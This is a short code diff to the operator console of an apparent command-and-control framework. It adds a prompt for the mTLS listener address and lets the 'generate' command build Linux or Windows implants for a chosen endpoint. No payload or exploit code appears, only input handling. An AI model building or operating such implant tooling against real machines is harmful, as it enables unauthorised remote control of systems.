@@ -17,8 +17,12 @@ def main():
     requestq = Queue()
     handler = Handler(requestq)
     handler.start()
-    print("Generating certificates...")
-    listener = mtls.Listener(requestq)
+    endpoint = input("Enter Listner Address (Example: 172.17.0.2:31337)\n> ")
+    try:
+        listener = mtls.Listener(requestq, endpoint)
+    except Exception as e:
+        print(e)
+        exit(1)
 
     while True:
         userin = input("> ")
@@ -44,8 +48,16 @@ def main():
                 print("Usage: use <session>")
         # Compile an implant
         elif userin[0] == "generate":
+            if len(userin) != 3:
+                print("Usage: generate <endpoint> linux|windows")
+                continue
+
+            if userin[2] != "linux" and userin[2] != "windows":
+                print("Usage: generate 172.17.0.1:1337 linux|windows")
+                continue
+
             print("Generating the implant...")
-            generate(listener.client_certs)
+            generate(listener.client_certs, userin[1], userin[2])
 
 
 if __name__ == "__main__":
